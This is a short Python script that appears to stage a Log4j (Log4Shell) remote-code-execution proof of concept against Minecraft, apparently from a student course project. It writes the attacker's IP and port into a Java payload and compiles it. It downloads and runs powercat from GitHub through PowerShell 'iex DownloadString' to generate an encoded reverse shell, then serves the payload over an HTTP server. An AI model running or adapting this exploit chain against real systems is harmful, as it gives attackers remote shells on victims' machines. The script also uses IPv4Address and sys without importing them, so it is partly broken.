#!/usr/bin/env python3

import json
import os
import subprocess

if __name__ == "__main__":
    with open("config.json", "r") as f:
        config = json.load(f)

    try:
        # If IPv4Network(3rd parameter is not a valid ip range, then will kick you to the except block.)
        print(f"{IPv4Address(sys.argv[1])}")
        # If it is valid it will assign the ip_range from the 3rd parameter.
        ip_addr = sys.argv[1]
        print("Valid ip address entered through command-line.")
    except:
        # Automatically get ip address
        lines = subprocess.check_output(["ip", "a", "s", "eth0"]).decode("utf-8").splitlines()
        for line in lines:
            if line.lstrip().startswith("inet"):
                ip_addr = line.lstrip().split(" ", 2)[1].split("/", 2)[0]
                break

    print("**Installing powershell!**\n")
    subprocess.run(["sudo", "apt", "install", "powershell", "-y"])

    os.chdir("./poc/")

    with open("Log4jRCE.java", "r") as f:
        code = f.read()

    with open("Log4jRCE.java", "w") as f:
        f.write(code.replace("<ip>", ip_addr).replace("<port>", config['payload_port']))

    subprocess.run(["pwsh", "-c", "iex",
                    "(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/CZ4062-Group-32/powercat/master/powercat.ps1');",
                    "powercat", "-c", ip_addr, "-p", config['shell_port'], "-e", "cmd.exe", "-ge", ">",
                    "~/log4jminecraft/poc/shell.txt"])

    subprocess.run(["javac", "Log4jRCE.java"])
    subprocess.run(["python3", "-m", "http.server", config['payload_port']])
